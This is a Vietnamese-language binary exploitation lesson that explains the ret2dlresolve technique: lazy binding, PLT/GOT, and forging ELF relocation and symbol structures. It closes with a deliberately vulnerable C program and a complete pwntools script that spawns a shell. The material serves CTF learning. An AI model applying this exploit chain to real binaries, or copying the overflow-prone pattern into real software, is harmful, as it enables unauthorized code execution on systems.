# ret2dlresolve — ép linker tự resolve `system` cho ta (KHÔNG cần leak libc)

> **Bài giảng tự chứa.** Đọc hết file này là hiểu: lazy binding / PLT / GOT hoạt động ra sao,
> `_dl_runtime_resolve` là cái gì và làm gì, ba cấu trúc `Elf64_Rela` / `Elf64_Sym` / `.dynstr`
> nằm ở đâu và liên kết với nhau thế nào, cách **tự tay tìm chúng trong GDB/readelf**, vì sao ta
> lừa được linker, và **nhìn một challenge thế nào thì biết áp dụng được kỹ thuật này**. Phần
> writeup để ở cuối và rút gọn — trọng tâm là cơ chế, không phải log ra shell.

---

## 0. Bạn cần nắm trước (kiến thức nền, đọc kỹ phần này)

Toàn bộ ret2dlresolve xoay quanh **cách một hàm libc được "nối" vào chương trình lúc chạy**. Nếu
chưa chắc 4 ý dưới, kỹ thuật sẽ như phép thuật. Nắm rồi thì nó rất cơ học.

### 0.1. Dynamic linking là gì?
Binary động (không `-static`) **không chứa code của `system`, `puts`...**. Nó chỉ ghi "tôi cần hàm
tên `system` từ `libc`". Lúc chạy, **dynamic linker** (`ld-linux-x86-64.so.2`, còn gọi là `ld.so`
hay **rtld**) nạp libc vào bộ nhớ rồi **điền địa chỉ thật** của từng hàm vào một bảng con trỏ để
chương trình gọi. "Resolve một symbol" = **tìm ra địa chỉ thật của hàm theo tên** rồi ghi lại.

### 0.2. PLT và GOT — hai bảng cốt lõi
Khi code gọi `system()`, compiler **không** gọi thẳng libc (chưa biết địa chỉ). Nó gọi `system@plt`.

- **GOT** (`.got.plt`, Global Offset Table): bảng **con trỏ hàm**, mỗi hàm ngoại một ô 8 byte.
  Đây là nơi **cuối cùng** chứa địa chỉ thật của `system` sau khi resolve. GOT **ghi được** (nằm
  trong vùng data), đó là lý do GOT-overwrite tồn tại.
- **PLT** (`.plt`, Procedure Linkage Table): các stub code nhỏ. `system@plt` chỉ là:
  `jmp *system@got`. Tức "nhảy tới địa chỉ đang nằm trong ô GOT của system".

Luồng bình thường: `call system@plt` → PLT `jmp *[got]` → got chứa địa chỉ thật → chạy `system`.

### 0.3. Lazy binding — mấu chốt của kỹ thuật
Resolve hết mọi hàm lúc khởi động thì chậm (hàm có thể không bao giờ được gọi). Nên mặc định dùng
**lazy binding**: **chỉ resolve khi hàm được gọi lần đầu**. Thủ thuật: ô GOT ban đầu **không** trỏ
tới `system` thật, mà trỏ **quay lại PLT stub** của chính nó (lệnh ngay sau `jmp`). Nên lần đầu:

```
system@plt:
    jmp   *system@got.plt      ; (1) ô GOT còn trỏ về (2) bên dưới → không nhảy đi đâu cả
    push  <reloc_index>        ; (2) đẩy "số thứ tự relocation" của system
    jmp   plt0                 ; (3) nhảy về PLT[0]
plt0:
    push  *(got+8)             ; đẩy link_map (con trỏ mô tả binary này, do ld.so dựng)
    jmp   *(got+16)            ; nhảy vào _dl_runtime_resolve
```

Nói cách khác, **lần gọi đầu thực chất là gọi `_dl_runtime_resolve(link_map, reloc_index)`**. Hàm
này resolve xong sẽ **ghi địa chỉ thật vào ô GOT**, nên **lần sau** `jmp *[got]` mới nhảy thẳng
tới `system`. Full RELRO tắt lazy binding (xem §5) → kỹ thuật này **không** dùng được.

### 0.4. Vì sao điều này mở ra khai thác?
`_dl_runtime_resolve` nhận **`reloc_index` từ stack** (do lệnh `push` trong PLT đẩy lên). Trong
khai thác, **ta kiểm soát stack / tham số** → ta tự gọi `_dl_runtime_resolve` với `reloc_index`
**do ta chọn**, trỏ tới cấu trúc **giả** ta dựng. Linker không kiểm tra `reloc_index` có nằm trong
giới hạn, cũng không kiểm tra các cấu trúc có hợp lệ → nó đọc tên hàm từ chuỗi **ta đặt**
(`"system"`), tìm trong libc, rồi **gọi** — **mà ta không hề cần biết địa chỉ libc**.

> **Nói ngắn:** *lazy binding cho phép "gọi hàm theo tên" lúc runtime. ret2dlresolve = giả mạo các
> cấu trúc mô tả cái tên đó (`Rela → Sym → chuỗi "system"`) rồi nhờ `_dl_runtime_resolve` resolve
> hộ — nên không cần leak gì hết.*

---

## 1. Kỹ thuật này tập trung vào cái gì?

| Thành phần | Vai trò | Nằm ở đâu |
|-----------|---------|-----------|
| **`_dl_runtime_resolve`** | Hàm của `ld.so` làm việc resolve. Ta **gọi lại nó** thủ công | trong `ld.so` (lấy địa chỉ gián tiếp qua `.plt[0]` / `got+16`) |
| **`.rela.plt`** (mảng `Elf64_Rela`) | Mỗi phần tử mô tả 1 relocation: "ô GOT nào, dùng symbol nào" | section cố định trong binary (`DT_JMPREL`) |
| **`.dynsym`** (mảng `Elf64_Sym`) | Mỗi phần tử mô tả 1 symbol: tên (offset vào `.dynstr`), kiểu... | section cố định (`DT_SYMTAB`) |
| **`.dynstr`** | Kho chuỗi tên hàm: `"system\0puts\0..."` | section cố định (`DT_STRTAB`) |
| **`reloc_index`** | Chỉ số vào `.rela.plt`. **Tham số ta điều khiển** | ta push lên stack khi gọi resolver |
| **Vùng ghi được (bss/data)** | Nơi ta đặt `Rela`/`Sym`/chuỗi **giả** | `.bss`/`.data` của binary (No PIE → cố định) |

**Kỹ thuật dùng để trigger:** thường là **BOF** (stack overflow → ROP). Ta cần:
1. Một ROP chain **ghi payload giả vào bss** (thường qua `read`/`gets` có sẵn).
2. Một ROP chain **gọi `_dl_runtime_resolve`** với `reloc_index` trỏ tới `Rela` giả.

Chuỗi liên kết khi resolve: `reloc_index` → chọn `Elf64_Rela[reloc_index]` → trường `r_info` cho
biết **chỉ số symbol** → chọn `Elf64_Sym[sym_index]` → trường `st_name` là **offset vào `.dynstr`**
→ ra chuỗi `"system"`. Ta làm giả cả chuỗi này.

---

## 2. Ba cấu trúc — từng trường một (đây là phần người ta hay bỏ qua)

### 2.1. `Elf64_Rela` (24 byte)
```c
typedef struct {
    Elf64_Addr    r_offset;   // +0x00: địa chỉ ô GOT sẽ được ghi địa chỉ thật vào
    Elf64_Xword   r_info;     // +0x08: (sym_index << 32) | type;  type của PLT = R_X86_64_JUMP_SLOT (7)
    Elf64_Sxword  r_addend;   // +0x10: 0 với JUMP_SLOT
} Elf64_Rela;
```
- `r_offset`: sau khi resolve, linker ghi địa chỉ `system` thật vào đây. Với ta không quan trọng
  trỏ đúng đâu (ta lấy giá trị trả về/được gọi ngay), nhưng để an toàn cho nó trỏ vào một ô GOT
  hợp lệ.
- `r_info`: **quan trọng nhất**. Nửa cao (`>>32`) là **chỉ số symbol** trong `.dynsym`. Ta tính
  index này sao cho `Elf64_Sym[index]` rơi đúng vào `Sym` giả của ta.

> **Cạm bẫy r_info nổi tiếng:** `sym_index` được linker dùng kiểu `symtab[sym_index]`, tức nhân với
> `sizeof(Elf64_Sym)=24`. Nếu bạn đặt `Sym` giả ở offset `D` so với `.dynsym` thì cần
> `sym_index = D / 24` và `D` phải **chia hết cho 24**. Đây là lý do dựng tay hay lệch — pwntools
> lo giúp (xem §4). Một số libc/rtld mới còn **kiểm tra sym nằm trong `.dynsym`** → phải đặt `Sym`
> giả **ngay sau** `.dynsym` thật, không đặt tùy ý trong bss. Đó là lúc dựng tay khó, dùng pwntools.

### 2.2. `Elf64_Sym` (24 byte)
```c
typedef struct {
    Elf32_Word    st_name;    // +0x00: offset (byte) vào .dynstr → tên hàm, vd "system"
    unsigned char st_info;    // +0x04: binding/type. Đặt 0x12 (GLOBAL FUNC) cho chắc
    unsigned char st_other;   // +0x05: 0
    Elf32_Section st_shndx;   // +0x06: 0
    Elf64_Addr    st_value;   // +0x08: 0 (linker tự điền sau khi tìm thấy)
    Elf64_Xword   st_size;    // +0x10: 0
} Elf64_Sym;
```
- `st_name`: trỏ tới chuỗi `"system\0"` ta đặt (tính offset so với đầu `.dynstr`).

### 2.3. `.dynstr`
Chỉ là chuỗi thô. Ta thêm `"system\0"` (hoặc trỏ tới một `"system"` có sẵn nếu may mắn binary đã
import `system`). `st_name` của `Sym` giả = (địa_chỉ_chuỗi_giả − địa_chỉ_đầu_`.dynstr`).

**Tóm tắt liên kết:** `reloc_index` ↦ `Rela.r_info>>32 = sym_index` ↦ `Sym.st_name` ↦ `"system"`.

---

## 3. Tự tìm mọi thứ trong GDB / readelf (kỹ năng cốt lõi)

Ba section này nằm cố định trong binary (No PIE). Cách lấy địa chỉ:

**a) `.dynamic` cho 3 con trỏ gốc** — linker tìm mọi thứ qua `.dynamic`:
```bash
readelf -d ./chall        # DT_STRTAB (.dynstr), DT_SYMTAB (.dynsym), DT_JMPREL (.rela.plt)
```
Nhìn các dòng:
```
0x...  (STRTAB)   0x401... → đầu .dynstr
0x...  (SYMTAB)   0x401... → đầu .dynsym
0x...  (JMPREL)   0x401... → đầu .rela.plt
0x...  (PLTRELSZ) → tổng kích thước .rela.plt (chia 24 = số relocation có thật)
```

**b) Xem các relocation PLT có sẵn** (để biết layout `Rela`, và chỉ số resolve hợp lệ nhỏ nhất):
```bash
readelf -r ./chall        # phần ".rela.plt" liệt kê từng JUMP_SLOT + tên symbol
objdump -d -j .plt ./chall   # xem từng PLT stub + lệnh "push <index>"
```
Trong `objdump`, mỗi `push $0xN` trong stub chính là `reloc_index` thật của hàm đó → bạn thấy ngay
reloc_index đánh số từ 0 tăng dần.

**c) Lấy `_dl_runtime_resolve` để gọi tay** (nếu không dùng pwntools `ret2dlresolve`):
- Cách dễ: nó được trỏ gián tiếp tại `.plt[0]`, mà `.plt[0]` làm `push [got+8]; jmp *[got+16]`.
  Nên **chỉ cần nhảy vào `.plt[0]`** (địa chỉ `plt` − 0x10 so với plt entry đầu, hoặc đọc
  `objdump -d -j .plt`) sau khi đã `push reloc_index` → nó tự lấy resolver từ `got+16`.
- Trong GDB, xem GOT và resolver lúc runtime:
```gdb
info files                 # in địa chỉ nạp các section (.plt, .got.plt, .dynstr...)
x/3gx &_GLOBAL_OFFSET_TABLE_   # got[0]=.dynamic, got[1]=link_map, got[2]=_dl_runtime_resolve
telescope 0x403fe8           # (pwndbg) soi .got.plt để thấy got[1], got[2]
```
`got[2]` (ô thứ 3) **chính là** địa chỉ `_dl_runtime_resolve` — nhưng ô này **chỉ được điền sau
lần resolve đầu**, nên khi khai thác ta đi qua `.plt[0]` cho chắc, không hardcode nó.

**d) Chọn `data_addr` (bss) đặt cấu trúc giả:**
```bash
readelf -S ./chall | grep -E 'bss|data'    # lấy địa chỉ + size .bss/.data
```
Chọn vùng bss đủ rộng, không bị chương trình ghi đè. No PIE → địa chỉ này cố định mọi lần chạy.

---

## 4. Dựng payload bằng pwntools (được khuyến nghị)

Dựng tay 3 cấu trúc + lo cạn bẫy `r_info`/alignment rất dễ sai. `Ret2dlresolvePayload` làm hết:

```python
from pwn import *
from pwnlib.rop.ret2dlresolve import Ret2dlresolvePayload
context.binary = exe = ELF("./chall", checksec=False)

dl = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])
# dl.payload   : khối byte chứa Rela+Sym+chuỗi "system"+"/bin/sh" đã căn chỉnh sẵn
# dl.data_addr : địa chỉ bss mà pwntools chọn để đặt khối đó

rop = ROP(exe)
rop.read(0, dl.data_addr, len(dl.payload))   # giai đoạn 1: đọc dl.payload vào bss
rop.ret2dlresolve(dl)                         # giai đoạn 2: push reloc_index + nhảy .plt[0]
```
Hai dòng `rop.read` / `rop.ret2dlresolve` cần gadget set `rdi/rsi/rdx` (cho `read`). Thiếu
`pop rdi` thì dùng [ret2csu](ret2csu.md) (lưu ý `edi` 32-bit). `rop.ret2dlresolve(dl)` tự đặt
`reloc_index` đúng và nhảy `.plt[0]`.

**Hiểu từng mảnh để debug khi nó lỗi:** nếu shell không bung, 90% là (1) `data_addr` bị chương
trình ghi đè, (2) libc/rtld mới chặn `sym_index` ngoài `.dynsym` — khi đó đặt khối giả **sát
`.dynsym`** hoặc đổi cách khác (xem §5), (3) chưa đủ gadget set `rdx` nên `read` đọc thiếu byte.

---

## 5. Nhận diện challenge: khi nào ĐƯỢC / KHÔNG được dùng

Nhìn `checksec` + mô tả I/O để quyết, **trước khi** viết payload:

| Dấu hiệu | Ý nghĩa với ret2dlresolve |
|---------|---------------------------|
| **No PIE** | ✅ Rất hợp — địa chỉ bss/`.plt`/section cố định, dễ dựng |
| **Partial RELRO / No RELRO** | ✅ Lazy binding còn bật → `_dl_runtime_resolve` còn chạy |
| **Full RELRO** | ❌ GOT resolve sẵn lúc load, lazy binding tắt → **không dùng được** |
| **Không có đường leak** (không in gì, hoặc chỉ ghi 1 lần) | ✅ Đây là lúc dlresolve tỏa sáng (ret2libc cần leak, dlresolve thì không) |
| **Ghi được 1 vùng bss cố định + có `read`/`gets`** | ✅ Có chỗ đặt cấu trúc giả |
| **PIE bật** | ⚠️ Khó hơn: cần leak PIE base để biết địa chỉ bss/section → mất ưu thế "không leak" |
| **Static binary** | ❌ Không có dynamic linker → không có cơ chế này; dùng ret2syscall thay thế |

**Phản xạ nhận diện:** thấy *"No PIE + Partial RELRO + overflow + không leak được + không có
`system` trong binary"* → nghĩ ngay ret2dlresolve. Nếu **Full RELRO** → chuyển hướng (leak + ret2libc,
hoặc GOT không ghi được nữa thì tìm hướng khác).

> **Vì sao Full RELRO chặn:** Full RELRO ép linker resolve **toàn bộ** symbol ngay lúc load rồi
> **set GOT read-only**. Lúc đó `got+16` không còn trỏ `_dl_runtime_resolve` theo cách lazy, và
> PLT stub không còn đi qua resolver nữa → cơ chế ta lợi dụng biến mất.

---

## 6. Luồng khai thác (ý tưởng tổng quát để tự áp dụng)

1. **Xác nhận điều kiện** (§5): No PIE, Partial/No RELRO, có overflow, có `read`/`gets` ghi bss.
2. **Tìm địa chỉ:** bss (`data_addr`), gadget set rdi/rsi/rdx, địa chỉ hàm nhập liệu (`read@plt`).
3. **Giai đoạn 1 — nạp cấu trúc giả:** ROP gọi `read(0, data_addr, len)` để đổ khối
   `Rela+Sym+"system"+"/bin/sh"` vào bss.
4. **Giai đoạn 2 — trigger resolve:** set `rdi = địa chỉ "/bin/sh"` (nằm trong khối vừa nạp),
   rồi `push reloc_index; jmp .plt[0]`. Linker resolve `system` và **gọi ngay** với `rdi` đó.
5. **Kết quả:** `system("/bin/sh")` chạy — chưa từng chạm địa chỉ libc.

Điểm then chốt phải tự set đúng: **`rdi` phải trỏ `"/bin/sh"`** *trước khi* nhảy resolver, vì
sau khi resolve xong linker nhảy thẳng vào hàm, dùng luôn thanh ghi hiện tại làm tham số.

---

## 7. Writeup rút gọn (demo verify — tham khảo nhanh)

```c
// dlres.c — gcc -no-pie -fno-stack-protector -z norelro dlres.c -o dlres   (Partial/No RELRO)
void gadgets(){ asm("pop %rdi; ret; pop %rsi; pop %r15; ret; pop %rdx; ret"); }
void vuln(){ char buf[0x20]; read(0, buf, 0x200); }   // không leak, không có system
int main(){ vuln(); }
```
```python
from pwn import *
from pwnlib.rop.ret2dlresolve import Ret2dlresolvePayload
context.binary = exe = ELF("./dlres", checksec=False)
p = process(exe.path)
dl = Ret2dlresolvePayload(exe, symbol="system", args=["/bin/sh"])
rop = ROP(exe)
rop.read(0, dl.data_addr, len(dl.payload))
rop.ret2dlresolve(dl)
p.send(flat(b"A"*0x28, rop.chain()))   # offset = buf 0x20 + saved rbp 8
p.send(dl.payload)                      # read() ở trên nuốt khối này vào bss
p.interactive()
```
Chạy ra shell. Muốn **dựng tay** (không pwntools) để hiểu sâu hơn: xem link ir0nstone ở cuối — nó
đặt từng `Rela/Sym/str` bằng `flat()` và tính `reloc_index` thủ công.

---

## 8. Bài tập (luyện nhận diện + vận dụng)

| Bài | Mức | Học gì |
|-----|-----|--------|
| demo §7 | ⭐⭐ | dlresolve chuẩn bằng pwntools |
| ir0nstone *ret2dlresolve* | ⭐⭐ | **dựng tay** từng cấu trúc, hiểu `r_info`/alignment |
| `ret2libc_stackpivot` (local) | ⭐⭐⭐⭐ | dlresolve khi **thiếu `pop rdi`/csu**: dùng gadget lạ `mov edi,0x404040; jmp rax` set rdi=bss rồi ghép stack pivot |
| pwnable.tw static | ⭐⭐⭐ | đối chiếu: static → **không** dùng dlresolve, phải ret2syscall |

**Lộ trình học:** hiểu PLT/GOT + lazy binding (§0) → đọc 3 cấu trúc (§2) → tìm chúng trong GDB (§3)
→ chạy demo pwntools (§7) → **dựng tay** theo ir0nstone → luyện nhận diện bằng bảng §5.

---

## Nguồn tham khảo
- ir0nstone — *ret2dlresolve* (dựng tay chi tiết): <https://ir0nstone.gitbook.io/notes/binexp/stack/ret2dlresolve>
- pwntools `Ret2dlresolvePayload`: <https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html>
- Liên quan: [ret2csu.md](ret2csu.md) (gadget set rdi/rsi/rdx) · [ret2libc.md](ret2libc.md) · [stack_pivot.md](stack_pivot.md)
